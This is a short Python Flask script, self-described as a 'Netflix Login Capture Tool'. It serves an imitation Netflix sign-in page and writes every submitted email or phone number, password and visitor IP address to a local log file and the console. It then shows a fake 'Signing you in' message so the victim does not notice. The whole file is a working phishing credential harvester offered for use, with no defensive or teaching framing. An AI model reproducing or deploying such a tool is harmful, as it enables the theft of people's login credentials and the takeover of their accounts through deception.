from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
SAVE_PATH = "/sdcard/HackerTF"
LOG_FILE = os.path.join(SAVE_PATH, "log.txt")
os.makedirs(SAVE_PATH, exist_ok=True)

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Netflix</title>
    <style>
        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 60px; }
        .login-box { background: #111; padding: 30px; border-radius: 10px; width: 320px; margin: auto; box-shadow: 0 0 15px rgba(255,0,0,0.5); }
        input, button { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        button { background-color: #e50914; color: white; font-weight: bold; cursor: pointer; }
        img { width: 100px; margin-bottom: 20px; }
        h2 { color: #e50914; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
        <h2>Sign In</h2>
        <form method="POST" action="/login">
            <input type="text" name="email" placeholder="Email or phone number" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_template)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr

    log = f"""
[+] Netflix Login
IP: {ip}
Email/Phone: {email}
Password: {password}
----------------------------
"""
    print(log)
    with open(LOG_FILE, "a") as f:
        f.write(log)

    return "<h3>Signing you in to Netflix...</h3>"

if __name__ == '__main__':
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;31m" + "="*40)
    print("         Made by HACKER TF        ")
    print("      Netflix Login Capture Tool  ")
    print("="*40 + "\033[0m")
    print("Server running on: http://localhost:5000\n")
    app.run(host="0.0.0.0", port=5011)